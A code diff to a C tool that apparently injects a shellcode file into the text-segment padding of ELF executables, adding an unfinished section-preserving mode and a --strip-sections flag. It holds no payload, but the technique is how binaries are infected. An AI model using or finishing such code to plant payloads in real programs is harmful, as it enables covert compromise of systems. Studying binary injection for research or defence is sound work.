@@ -12,8 +12,11 @@
 #include "include/elf/external.h"
 
 // TODO: move forward by the necessary number of pages, not just one
-// TODO: preserve the sections
 // TODO: patch the shell to return to the right place
+// TODO: fully implement the section stripping mode and the section preserving mode
+// TODO: extend the size of the last section in the section preserving mode
+// TODO: make the write calls more robust by accepting partial writes and re-trying the writes in those cases
+// TODO: make this code compile without warnings
 
 static long long page_size = 0x1000;
 static unsigned shell_size;
@@ -70,6 +73,7 @@ typedef struct {
   long long phdr_offset;
   short phdr_num;
   long long text_end;
+  int preserve_sections;
 } processing_state;
 
 // returns the number of bytes consumed, 0 on end of stream and negative on error
@@ -94,11 +98,19 @@ int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd)
       // 2. extract the size of phdr
       memcpy(&ps->phdr_num, ps->ehdr.e_phnum, sizeof(ps->ehdr.e_phnum));
 
-      // 3. get rid of sections
-      memset(&ps->ehdr.e_shoff, 0, sizeof(ps->ehdr.e_shoff));
-      memset(&ps->ehdr.e_shentsize, 0, sizeof(ps->ehdr.e_shentsize));
-      memset(&ps->ehdr.e_shnum, 0, sizeof(ps->ehdr.e_shnum));
-      memset(&ps->ehdr.e_shstrndx, 0, sizeof(ps->ehdr.e_shstrndx));
+      // 3. zero out the section pointers
+      if (ps->preserve_sections == 0) {
+        memset(&ps->ehdr.e_shoff, 0, sizeof(ps->ehdr.e_shoff));
+        memset(&ps->ehdr.e_shentsize, 0, sizeof(ps->ehdr.e_shentsize));
+        memset(&ps->ehdr.e_shnum, 0, sizeof(ps->ehdr.e_shnum));
+        memset(&ps->ehdr.e_shstrndx, 0, sizeof(ps->ehdr.e_shstrndx));
+      }
+      else {
+        // 3.1. move the location of the header sections forward by a page
+
+        // 3.2. move the start of sections that are after the break forward by a page
+
+      }
 
       // 4. allocate a phdr array
       ps->phdr = malloc(ps->phdr_num * sizeof(Elf64_External_Phdr));
@@ -207,7 +219,12 @@ int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd)
       }
     } else if (len > 0) {
       fprintf(stderr, "+++\n");
-      consumed_bytes = len;
+      if (ps->preserve_sections == 0) {
+        // TODO: If we are supposed to strip the sections, we finish early and don't write them all out
+        consumed_bytes = len;
+      } else {
+        consumed_bytes = len;
+      }
       if (write(out_fd, buff, consumed_bytes) != consumed_bytes) {
         return -6;
       }
@@ -223,9 +240,10 @@ done:
   return consumed_bytes;
 }
 
-int process(int in_fd, int out_fd) {
+int process(int in_fd, int out_fd, int preserve_sections) {
   processing_state ps;
   memset(&ps, 0, sizeof(ps));
+  ps.preserve_sections = preserve_sections;
 
   unsigned char in_buff[BUFSIZ];
   int in_buff_len;
@@ -248,11 +266,19 @@ int process(int in_fd, int out_fd) {
 }
 
 int main(int argc, char* argv[]) {
-  if (argc != 2) {
-    fprintf(stderr, "Usage: %s <shell_path>", argv[0]);
+  // assume we want to preserve the sections
+  int preserve_sections = 1;
+
+  if (argc < 2) {
+    fprintf(stderr, "Usage: %s <shell_path> [--strip-sections]", argv[0]);
     return 0;
   }
   //XXX: a bit of a race condition here, TOCTOU, etc. but such is the way of the lazy; we check the size later again, I guess...
+  if (argc >= 3) {
+    if (strcmp(argv[2], "--strip-sections") == 0) {
+      preserve_sections = 0;
+    }
+  }
   shell_size = get_file_size(argv[1]);
   if (shell_size == -1) {
     fprintf(stderr, "Failed to stat shell file: %s", argv[1]);
@@ -262,7 +288,7 @@ int main(int argc, char* argv[]) {
   if (!shell) {
     return 1;
   }
-  int ret = process(STDIN_FILENO, STDOUT_FILENO);
+  int ret = process(STDIN_FILENO, STDOUT_FILENO, preserve_sections);
   free(shell);
   return ret;
 }
